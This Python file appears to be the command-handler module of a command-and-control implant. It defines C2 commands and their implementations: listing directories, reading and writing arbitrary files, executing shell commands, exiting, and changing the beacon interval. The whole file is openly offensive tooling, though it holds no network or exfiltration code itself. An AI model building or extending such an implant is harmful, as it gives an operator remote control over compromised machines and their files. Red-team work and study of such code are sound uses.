
from enum import Enum
import os
import subprocess

class commands(Enum):
    """
    Listing of possible c2 commands
    """
    DIR = 1 # Get dir contents
    GET = 2 # Get file contents
    PUT = 3 # Put file
    EXE = 4 # Execute shell command
    DIE = 5 # Exit program
    INT = 6 # Set beacon interval

    @staticmethod
    def do_dir(dir):
        """
        Return the contents of a directory
        """
        proc = subprocess.run(["ls", "-l", dir], capture_output=True)
        result = b""
        if proc.returncode != 0:
            result = proc.stderr
        else:
            result = proc.stdout

        return result

    @staticmethod
    def do_get(filename):
        """
        Return the contents of 'file'
        """
        try:
            f = open(filename, "rb")
            result = f.read()
            f.close()
        except:
            result = b"File failed to open and read"

        return result

    @staticmethod
    def do_put(filename, data):
        """
        Create a file, with data
        """
        # TODO: Binary mode may or may not be good
        try:
            f = open(filename, "w")
            f.write(data)
            f.close()
            result = b"File successfully written"
        except:
            result = b"File failed to open or write"

        return result

    @staticmethod
    def do_exec(cmd):
        """
        Take in a list of strings representing command and args
        Execute the command, then return results
        """
        proc = subprocess.run(cmd, capture_output=True)
        result = b""
        if proc.returncode != 0:
            result = proc.stderr
        else:
            result = proc.stdout

        return result

    @staticmethod
    def do_die():
        """
        Return a string verifying exit
        """
        return b"Exiting"

    @staticmethod
    def do_interval(core, new_interval):
        core.interval = new_interval
        return "Interval updated to {}".format(new_interval).encode()

